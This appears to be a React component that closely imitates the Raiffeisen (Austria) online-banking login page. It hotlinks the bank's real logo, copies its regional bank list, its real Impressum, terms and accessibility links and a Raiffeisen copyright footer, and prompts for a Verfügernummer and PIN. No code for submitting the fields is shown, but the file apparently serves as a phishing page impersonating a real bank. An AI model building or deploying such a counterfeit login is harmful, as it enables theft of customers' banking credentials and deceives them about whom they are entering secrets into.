import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import bgImage from "@/assets/rbg_wald.jpg";

const bundeslaender = [
  "Burgenland",
  "Kärnten",
  "Niederösterreich/Wien",
  "Oberösterreich",
  "Salzburg",
  "Steiermark",
  "Tirol",
  "Vorarlberg",
  "Oberösterreich/Bank Direkt",
  "Oberösterreich/PRIVAT BANK",
  "Tirol/Jungholz",
  "Alpen Privatbank",
];

const Raiffeisenbank = () => {
  const [bundesland, setBundesland] = useState("");
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [saveVerfueger, setSaveVerfueger] = useState(false);

  return (
    <div
      className="relative flex min-h-screen flex-col items-center justify-center"
      style={{
        backgroundImage: `url(${bgImage})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundAttachment: "fixed",
      }}
    >
      {/* Login Card */}
      <div className="relative z-10 w-full max-w-md rounded-xl bg-white p-8 shadow-lg">
        {/* Logo */}
        <div className="mb-6 flex justify-center">
          <img
            src="https://sso.raiffeisen.at/mein-login/assets/raiffeisen-logo.svg"
            alt="Raiffeisen Logo"
            className="h-16"
          />
        </div>

        <h1 className="mb-2 text-xl font-bold text-foreground">
          Bitte melden Sie sich an
        </h1>
        <p className="mb-6 text-sm text-muted-foreground">
          Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
        </p>

        {/* Bundesland Dropdown */}
        <div className="mb-4">
          <Label className="mb-1 block text-sm text-foreground">
            Bundesland oder Bank wählen <span className="text-destructive">*</span>
          </Label>
          <Select value={bundesland} onValueChange={setBundesland}>
            <SelectTrigger className="w-full border-b-2 border-t-0 border-l-0 border-r-0 rounded-none bg-[#f5f5f5] focus:border-b-[#1a1a1a]">
              <SelectValue placeholder="Bitte wählen" />
            </SelectTrigger>
            <SelectContent>
              {bundeslaender.map((bl) => (
                <SelectItem key={bl} value={bl}>
                  {bl}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {/* Verfügernummer */}
        <div className="mb-4">
          <Label className="mb-1 block text-sm text-foreground">
            Verfügernummer eingeben <span className="text-destructive">*</span>
          </Label>
          <Input
            type="text"
            value={verfueger}
            onChange={(e) => setVerfueger(e.target.value)}
            className="border-b-2 border-t-0 border-l-0 border-r-0 rounded-none bg-[#f5f5f5] focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-b-[#1a1a1a]"
          />
        </div>

        {/* PIN */}
        <div className="mb-4">
          <Label className="mb-1 block text-sm text-foreground">
            PIN eingeben <span className="text-destructive">*</span>
          </Label>
          <Input
            type="password"
            maxLength={5}
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            className="border-b-2 border-t-0 border-l-0 border-r-0 rounded-none bg-[#f5f5f5] focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-b-[#1a1a1a]"
          />
        </div>

        {/* Checkbox */}
        <div className="mb-6 flex items-center gap-2">
          <Checkbox
            id="save-verfueger"
            checked={saveVerfueger}
            onCheckedChange={(checked) => setSaveVerfueger(checked === true)}
          />
          <Label htmlFor="save-verfueger" className="text-sm text-foreground cursor-pointer">
            Verfüger speichern
          </Label>
        </div>

        {/* Weiter Button */}
        <button
          type="button"
          className="w-full rounded-md bg-[#FFC72C] py-3 text-sm font-semibold text-[#1a1a1a] hover:bg-[#e6b325] transition-colors disabled:opacity-50"
          disabled={!bundesland || !verfueger || !pin}
        >
          Weiter
        </button>
      </div>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 z-10 py-4">
        <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
          <a
            href="https://raiffeisen.at/de/online-banking/login/impressum.html"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:underline"
          >
            Impressum
          </a>
          <a
            href="https://raiffeisen.at/de/online-banking/login/nutzungsbedingungen.html"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:underline"
          >
            Nutzungsbedingungen
          </a>
          <a
            href="https://raiffeisen.at/de/meine-bank/kundenservice/barrierefreiheit/barrierefreiheitserklaerung.html"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:underline"
          >
            Barrierefreiheitserklärung
          </a>
          <span>© 2026 Raiffeisen</span>
        </div>
      </footer>
    </div>
  );
};

export default Raiffeisenbank;
